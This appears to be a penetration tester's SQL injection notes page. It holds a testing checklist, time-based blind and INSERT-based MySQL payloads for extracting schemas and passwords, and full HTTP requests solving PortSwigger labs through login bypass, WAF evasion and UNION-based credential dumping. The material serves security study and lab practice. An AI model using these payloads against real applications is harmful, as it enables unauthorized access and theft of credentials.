# SQL Injection

## Checks

- [ ] Look for any endpoint/functionality that seems like it is touching the DB
- Try injecting a single or double quote and look for changes in response
- Try adding comments on login forms to bypass authentication
- Try to enumerate the database type and version
- [ ] Check if you can trigger an error
- Visible errors
- Conditional errors (e.g., divide by zero)
- [ ] Check if you can trigger a conditional response
- [ ] Try to trigger a time delay


```text title="Basic sleep"
test@test.com' and 1=sleep(3);-- -
```

```text title="Find schema_name"
' or 1=(SELECT SLEEP(3) FROM information_schema.SCHEMATA WHERE SCHEMA_NAME like 'i%' LIMIT 1 );--
```

```text title="Find tables"
' or 1=(SELECT SLEEP(3) FROM information_schema.TABLES WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME like 'u%' LIMIT 1 );--
```


```text title="Find columns"
' and (SELECT sleep(3) from information_schema.COLUMNS where TABLE_SCHEMA = 'sqli_four' and TABLE_NAME = 'users' and COLUMN_NAME like 'u%' LIMIT 1);--+-
```


```text title="Find administrator's password"
' AND 1=(SELECT sleep(3) FROM users WHERE username = 'administrator' AND password like 'a%' LIMIT 1);-- -
```

- [ ] Look for any input fields that may be inserting rows into the database and check those for injection as well. 

!!! warning
	Be careful with testing this. Inserting rows into the db without consideration has the potential to break something in the application.

- Examples

```text title="Get distinct table schema"
title',(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.tables));--
```


```text title="Get table names from the sqli_five database"
title',(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables where TABLE_SCHEMA='sqli_five'));--
```


```text title="Get username and password"
title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'<br>') FROM sqli_five.users));--
```


- Blind insert examples

```text title="Basic blind sleep"
test',sleep(5),'');-- -
```


```text title="Blind sleep to get version"
',( select sleep(5) where version() like '8%' ) ,'');--
```


```text title="Get specific value"
',( select sleep(5) from flag where flag like 'a%' ),'');--
```

## Labs

- [ ] All PortSwigger SQLi Labs
- [ ] Audi-l/sql-labs
[GitHub - Audi-1/sqli-labs: SQLI labs to test error based, Blind boolean based, Time based.](https://github.com/Audi-1/sqli-labs)
- [ ] SpiderLabs/MCIR
[GitHub - SpiderLabs/MCIR: The Magical Code Injection Rainbow! MCIR is a framework for building configurable vulnerability testbeds. MCIR is also a collection of configurable vulnerability testbeds.](https://github.com/SpiderLabs/MCIR)

!!! tip "Note that these last two are not currently maintained"
## Tools

- [ ] sqlmap
- [ ] ghauri
[GitHub - r0oth3x49/ghauri: An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws](https://github.com/r0oth3x49/ghauri)

!!! tip "Custom headers are still by far the most common place to still find SQLi"

- [ ] hbsqli

## PortSwigger

??? example "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"

	1. Inject a single quote and note the 500 status code
	2. A second single quote fixes the error
	3. Send the below request to show all items
	
	```
	https://0a52006203faa000da9b48c500b90071.web-security-academy.net/filter?category=Gifts'%20OR%201=1--%20-
	```

??? example "SQL injection vulnerability allowing login bypass"

	1. Send the credentials `administrator:password` and notice that it fails
	2. Send the following request and bypass the authentication mechanism
	
	```
	POST /login HTTP/2
	Host: 0a610047042d1026803bee9900bd0078.web-security-academy.net
	Cookie: session=VKoDv0fEUU2tgdJAJhJauLtVwpmd4rZQ
	Content-Length: 83
	Cache-Control: max-age=0
	Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
	Sec-Ch-Ua-Mobile: ?0
	Sec-Ch-Ua-Platform: "macOS"
	Accept-Language: en-US,en;q=0.9
	Origin: https://0a610047042d1026803bee9900bd0078.web-security-academy.net
	Content-Type: application/x-www-form-urlencoded
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
	Sec-Fetch-Site: same-origin
	Sec-Fetch-Mode: navigate
	Sec-Fetch-User: ?1
	Sec-Fetch-Dest: document
	Referer: https://0a610047042d1026803bee9900bd0078.web-security-academy.net/login
	Accept-Encoding: gzip, deflate, br
	Priority: u=0, i
	
	csrf=foQ9RRJfFo7Z9DIialQ8ejlbNq0cBjwv&username=administrator%27--&password=password
	```

??? example "SQL injection with filter bypass via XML encoding"

	1. Check the stock on any item and note the POST request contains XML in the body
	2. Use `hex_entities` in hackvertor to obfuscate the payload to bypass the WAF
	3. Send the following request to get all credentials
	4. Log in as admin to solve the lab
	
	```
	POST /product/stock HTTP/2
	Host: 0a13008603ab45d581535c30006600e7.web-security-academy.net
	Cookie: session=ezecKklwjpcvZJxxOIOVONBzEq8NcPnl
	Content-Length: 190
	Sec-Ch-Ua-Platform: "macOS"
	Accept-Language: en-US,en;q=0.9
	Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
	Content-Type: application/xml
	Sec-Ch-Ua-Mobile: ?0
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
	Accept: */*
	Origin: https://0a13008603ab45d581535c30006600e7.web-security-academy.net
	Sec-Fetch-Site: same-origin
	Sec-Fetch-Mode: cors
	Sec-Fetch-Dest: empty
	Referer: https://0a13008603ab45d581535c30006600e7.web-security-academy.net/product?productId=1
	Accept-Encoding: gzip, deflate, br
	Priority: u=1, i
	
	<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId><@hex_entities>1 UNION SELECT username || '~' || password from users</@hex_entities></storeId></stockCheck>
	```

??? example "SQL injection attack, querying the database type and version on Oracle"

	1. Select a category in the web UI and note the request 
	2. Send the following request to get the banner and solve the lab
	
	```
	GET /filter?category=Gifts'%20UNION%20SELECT%20banner,null%20FROM%20v$version-- HTTP/2
	Host: 0a1f00d603e789b680603fdc00c50013.web-security-academy.net
	Cookie: session=E1ljg5KjhFV33kG7kGgW8vuCY2lDzxLe
	Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
	Sec-Ch-Ua-Mobile: ?0
	Sec-Ch-Ua-Platform: "macOS"
	Accept-Language: en-US,en;q=0.9
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
	Sec-Fetch-Site: same-origin
	Sec-Fetch-Mode: navigate
	Sec-Fetch-User: ?1
	Sec-Fetch-Dest: document
	Referer: https://0a1f00d603e789b680603fdc00c50013.web-security-academy.net/
	Accept-Encoding: gzip, deflate, br
	Priority: u=0, i
	
	
	```

??? example "SQL injection attack, querying the database type and version on MySQL and Microsoft"

	1. Select a category and observe the request
	2. Send the following request to get the version and solve the lab
	
	```
	GET /filter?category=Gifts'%20UNION%20SELECT%20version()%2cnull--%20- HTTP/2
	Host: 0ab000d3046e4cf28008082c003900cc.web-security-academy.net
	Cookie: session=xl90jJPPJV5H1mDHmvgGEXhZQzJIQWNc
	Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
	Sec-Ch-Ua-Mobile: ?0
	Sec-Ch-Ua-Platform: "macOS"
	Accept-Language: en-US,en;q=0.9
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
	Sec-Fetch-Site: same-origin
	Sec-Fetch-Mode: navigate
	Sec-Fetch-User: ?1
	Sec-Fetch-Dest: document
	Referer: https://0ab000d3046e4cf28008082c003900cc.web-security-academy.net/
	Accept-Encoding: gzip, deflate, br
	Priority: u=0, i
	
	
	```

??? example "SQL injection attack, listing the database contents on non-Oracle databases"

	1. Select a category and note the request/response.
	2. Send the following request to list the schema

	```
	GET /filter?category=Gifts'%20UNION%20SELECT%20schema_name,null%20FROM%20information_schema.schemata--%20- HTTP/1.1
	```
	
	3. List the tables with:
	
	```
	GET /filter?category=Gifts'%20UNION%20SELECT%20table_name,null%20FROM%20information_schema.tables%20WHERE%20table_schema='public'--%20- HTTP/1.1
	```
	
	4. Now get the columns for the `users_peqxpm` table
	
	```
	GET /filter?category=Gifts'%20UNION%20SELECT%20column_name,null%20FROM%20information_schema.columns%20WHERE%20table_name='users_peqxpm'--%20- HTTP/1.1
	```
	
	5. Get the username and password from the users table
	
	```
	GET /filter?category=Gifts'%20UNION%20SELECT%20username_idgnjq,password_qvlkep%20FROM%20users_peqxpm--%20- HTTP/1.1
	```
	
	6. Log in as the administrator to solve the lab

??? example "SQL injection attack, listing the database contents on Oracle"

	1. Select a category and observe the results
	2. Send the following request to get all tables

	```
	GET /filter?category=Pets'%20UNION%20SELECT%20null,table_name%20FROM%20all_tables--%20- HTTP/1.1
	```
	
	3. Get the column names with:
	
	```
	GET /filter?category=Pets'%20UNION%20SELECT%20null,column_name%20FROM%20all_tab_columns%20WHERE%20table_name='USERS_ACKRVW'--%20- HTTP/1.1
	```
	
	4. Get the usernames and passwords with the following request, and then log in as the administrator to solve the lab
	
	```
	GET /filter?category=Pets'%20UNION%20SELECT%20USERNAME_MHJXZT,PASSWORD_WAGPLI%20FROM%20USERS_ACKRVW--%20- HTTP/1.1
	```



--- 
## Videos

<iframe width="100%" height="468" src="https://www.youtube.com/embed/mQhe_eM0EfE?si=HmFKQt4eQHoFLUc4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>